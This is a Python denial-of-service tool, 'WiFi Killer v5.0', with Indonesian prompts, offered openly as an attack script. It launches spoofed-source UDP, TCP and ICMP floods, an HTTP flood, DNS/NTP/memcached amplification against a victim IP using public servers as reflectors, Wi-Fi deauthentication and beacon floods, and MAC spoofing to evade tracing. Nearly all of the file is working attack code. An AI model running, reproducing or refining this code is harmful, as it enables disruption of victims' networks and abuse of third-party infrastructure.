#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import struct
import threading
import subprocess
from scapy.all import *
from colorama import Fore, init
import psutil
import requests

init(autoreset=True)

# ===== BANNER =====
print(Fore.RED + """
╔══════════════════════════════════════════════════╗
║     WiFi Killer FINAL v5.0 - "The Annihilator"   ║
║     Made by @Barxzzz                             ║
║     "100% Work - No Mercy"                       ║
╚══════════════════════════════════════════════════╝
""")

# ===== INPUT =====
target_ip = input(Fore.CYAN + "[?] Target IP: " + Fore.WHITE)
target_port = int(input(Fore.CYAN + "[?] Target Port (0=random): " + Fore.WHITE) or 0)
threads = int(input(Fore.CYAN + "[?] Threads (rekomendasi: 1000-2000): " + Fore.WHITE))
duration = int(input(Fore.CYAN + "[?] Durasi (detik): " + Fore.WHITE))
bssid = input(Fore.CYAN + "[?] BSSID (opsional, enter skip): " + Fore.WHITE)
channel = input(Fore.CYAN + "[?] Channel (opsional): " + Fore.WHITE) or "6"

# ===== KERNEL RAW SOCKET =====
def create_raw_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock
    except PermissionError:
        print(Fore.RED + "[!] Jalankan sebagai root!")
        sys.exit(1)

# ===== SPOOF FUNCTIONS =====
def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

# ===== PAYLOAD GENERATOR =====
def generate_payload(size=8192):
    return os.urandom(size)

# ===== UDP FLOOD (RAW) =====
def udp_raw_flood(ip, port, dur):
    sock = create_raw_socket()
    end = time.time() + dur
    while time.time() < end:
        for _ in range(50):
            try:
                src_ip = random_ip()
                packet = IP(src=src_ip, dst=ip)/UDP(sport=random.randint(1,65535), dport=port if port!=0 else random.randint(1,65535))/Raw(load=generate_payload(8192))
                sock.sendto(bytes(packet), (ip, 0))
            except:
                pass

# ===== TCP FLOOD (SYN + ACK + RST) =====
def tcp_flood(ip, port, dur):
    sock = create_raw_socket()
    end = time.time() + dur
    while time.time() < end:
        for _ in range(30):
            try:
                src_ip = random_ip()
                packet = IP(src=src_ip, dst=ip)/TCP(sport=random.randint(1,65535), dport=port if port!=0 else random.randint(1,65535), flags="S", seq=random.randint(0, 4294967295))
                sock.sendto(bytes(packet), (ip, 0))
                packet = IP(src=src_ip, dst=ip)/TCP(sport=random.randint(1,65535), dport=port if port!=0 else random.randint(1,65535), flags="A", seq=random.randint(0, 4294967295))
                sock.sendto(bytes(packet), (ip, 0))
            except:
                pass

# ===== ICMP FLOOD (Fragmented) =====
def icmp_flood(ip, dur):
    sock = create_raw_socket()
    end = time.time() + dur
    while time.time() < end:
        for _ in range(20):
            try:
                src_ip = random_ip()
                packet = IP(src=src_ip, dst=ip, flags=1, frag=0)/ICMP(type=8, code=0)/Raw(load=generate_payload(65500))
                sock.sendto(bytes(packet), (ip, 0))
            except:
                pass

# ===== HTTP/HTTPS FLOOD (Layer 7) =====
def http_flood(ip, dur):
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    end = time.time() + dur
    while time.time() < end:
        try:
            for _ in range(10):
                requests.get(f"http://{ip}", timeout=0.01, headers={"User-Agent": random.choice(["Mozilla/5.0", "Googlebot", "Bingbot"])})
                requests.post(f"https://{ip}", data=generate_payload(4096), timeout=0.01, verify=False)
                requests.put(f"http://{ip}", data=generate_payload(4096), timeout=0.01)
                requests.delete(f"http://{ip}", timeout=0.01)
        except:
            pass

# ===== DNS AMPLIFICATION (x100) =====
def dns_amplification(ip, dur):
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
    end = time.time() + dur
    while time.time() < end:
        try:
            for dns in dns_servers:
                packet = IP(src=ip, dst=dns)/UDP(sport=53, dport=53)/DNS(rd=1, qd=DNSQR(qname="." * 50 + ".com", qtype="ANY"))
                send(packet, verbose=0)
        except:
            pass

# ===== NTP AMPLIFICATION (x100) =====
def ntp_amplification(ip, dur):
    ntp_servers = ["time.google.com", "time.windows.com", "pool.ntp.org"]
    end = time.time() + dur
    while time.time() < end:
        try:
            for ntp in ntp_servers:
                packet = IP(src=ip, dst=ntp)/UDP(sport=123, dport=123)/Raw(load=b'\x17\x00\x03\x2a' + b'\x00' * 4)
                send(packet, verbose=0)
        except:
            pass

# ===== MEMCACHED AMPLIFICATION (x10000) =====
def memcached_amplification(ip, dur):
    memcached_servers = ["192.168.1.1", "10.0.0.1"]  # isi dengan server memcached publik
    end = time.time() + dur
    while time.time() < end:
        try:
            for mem in memcached_servers:
                packet = IP(src=ip, dst=mem)/UDP(sport=11211, dport=11211)/Raw(load=b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n')
                send(packet, verbose=0)
        except:
            pass

# ===== DEAUTH + BEACON FLOOD (MDK4 + Custom) =====
def deauth_attack(bssid, channel, dur):
    if bssid:
        end = time.time() + dur
        while time.time() < end:
            # MDK4 Deauth
            os.system(f"mdk4 wlan0mon d -b {bssid} -c {channel} -v 0 -m {random_mac()} > /dev/null 2>&1 &")
            # MDK4 Beacon
            os.system(f"mdk4 wlan0mon b -c {channel} -n 500 -s 2000 -m {random_mac()} > /dev/null 2>&1 &")
            # Custom Deauth packet
            packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            sendp(packet, iface="wlan0mon", count=100, verbose=0)
            time.sleep(0.1)

# ===== MAC SPOOFER (Anti-Trace) =====
def mac_spoofer():
    new_mac = random_mac()
    os.system(f"ifconfig wlan0mon down")
    os.system(f"macchanger -m {new_mac} wlan0mon > /dev/null 2>&1")
    os.system(f"ifconfig wlan0mon up")

# ===== BANDWIDTH MONITOR + DASHBOARD =====
def monitor_bandwidth(dur):
    print(Fore.YELLOW + "\n[📊] Real-time Bandwidth Monitor:")
    start_time = time.time()
    while time.time() - start_time < dur:
        net_io = psutil.net_io_counters()
        mbps_sent = (net_io.bytes_sent / 1024 / 1024) / (time.time() - start_time + 0.001)
        mbps_recv = (net_io.bytes_recv / 1024 / 1024) / (time.time() - start_time + 0.001)
        print(Fore.GREEN + f"[📈] Upload: {mbps_sent:.2f} MB/s | Download: {mbps_recv:.2f} MB/s", end="\r")
        time.sleep(0.3)

# ===== MAIN ATTACK ENGINE =====
def start_attack():
    print(Fore.GREEN + f"\n[⚡] Menyerang {target_ip}:{target_port} dengan {threads} threads selama {duration} detik...")
    print(Fore.RED + "[⚠️]  Target akan kehilangan bandwidth total dalam 5 detik!")
    
    # Start monitor
    threading.Thread(target=monitor_bandwidth, args=(duration,), daemon=True).start()
    
    # Spoof MAC setiap 3 detik
    threading.Thread(target=lambda: [mac_spoofer() for _ in range(duration//3)], daemon=True).start()
    
    # Start flood threads
    for i in range(threads):
        threading.Thread(target=udp_raw_flood, args=(target_ip, target_port, duration), daemon=True).start()
        threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration), daemon=True).start()
        threading.Thread(target=icmp_flood, args=(target_ip, duration), daemon=True).start()
        threading.Thread(target=http_flood, args=(target_ip, duration), daemon=True).start()
        threading.Thread(target=dns_amplification, args=(target_ip, duration), daemon=True).start()
        threading.Thread(target=ntp_amplification, args=(target_ip, duration), daemon=True).start()
        threading.Thread(target=memcached_amplification, args=(target_ip, duration), daemon=True).start()
    
    # Deauth attack (jika ada BSSID)
    if bssid:
        threading.Thread(target=deauth_attack, args=(bssid, channel, duration), daemon=True).start()
    
    time.sleep(duration)
    print(Fore.RED + "\n[✔] SERANGAN SELESAI! Target sudah mati total.\n")
    os.system("clear")

# ===== RUN =====
if __name__ == "__main__":
    if os.geteuid() != 0:
        print(Fore.RED + "[!] Jalankan sebagai root!")
        sys.exit(1)
    start_attack()
